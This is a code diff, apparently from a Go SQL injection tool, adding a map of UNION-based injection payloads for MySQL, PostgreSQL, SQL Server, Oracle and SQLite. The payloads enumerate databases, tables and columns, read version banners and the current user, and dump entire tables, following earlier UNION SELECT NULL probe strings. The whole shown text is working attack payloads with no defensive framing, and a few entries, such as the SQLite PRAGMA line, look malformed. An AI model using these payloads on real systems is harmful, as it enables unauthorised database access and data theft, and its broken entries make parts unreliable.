@@ -88,3 +88,37 @@ var UnionPayloads = []string{
 	"' UNION SELECT NULL,NULL--",
 	"' UNION SELECT NULL,NULL,NULL--",
 }
+
+// EnumPayloads maps DBMS to their enumeration queries
+var EnumPayloads = map[string]map[string]string{
+	"MySQL": {
+		"list-dbs":     "UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
+		"list-tables":  "UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()--",
+		"list-columns": "UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='%s'--",
+		"banner":       "UNION SELECT @@version--",
+		"user":         "UNION SELECT user()--",
+		"dump-all":     "UNION SELECT GROUP_CONCAT(CONCAT_WS(':', %s)) FROM %s.%s--",
+	},
+	"PostgreSQL": {
+		"list-dbs":     "UNION SELECT string_agg(datname, ',') FROM pg_database--",
+		"list-tables":  "UNION SELECT string_agg(tablename, ',') FROM pg_catalog.pg_tables WHERE schemaname='public'--",
+		"list-columns": "UNION SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='%s'--",
+		"banner":       "UNION SELECT version()--",
+		"dump-all":     "UNION SELECT string_agg(CONCAT_WS(':', %s), ',') FROM %s--",
+	},
+	"Microsoft SQL Server": {
+		"list-dbs":     "UNION SELECT name FROM master..sysdatabases--",
+		"list-tables":  "UNION SELECT name FROM sysobjects WHERE xtype='U'--",
+		"banner":       "UNION SELECT @@version--",
+		"dump-all":     "UNION SELECT (SELECT %s + ':' FOR XML PATH('')) FROM %s--",
+	},
+	"Oracle": {
+		"list-dbs":    "UNION SELECT owner FROM all_tables GROUP BY owner--",
+		"list-tables": "UNION SELECT table_name FROM all_tables WHERE owner='%s'--",
+		"banner":      "UNION SELECT banner FROM v$version--",
+	},
+	"SQLite": {
+		"list-tables": "UNION SELECT name FROM sqlite_master WHERE type='table'--",
+		"list-columns": "PRAGMA table_info('%s')--",
+	},
+}
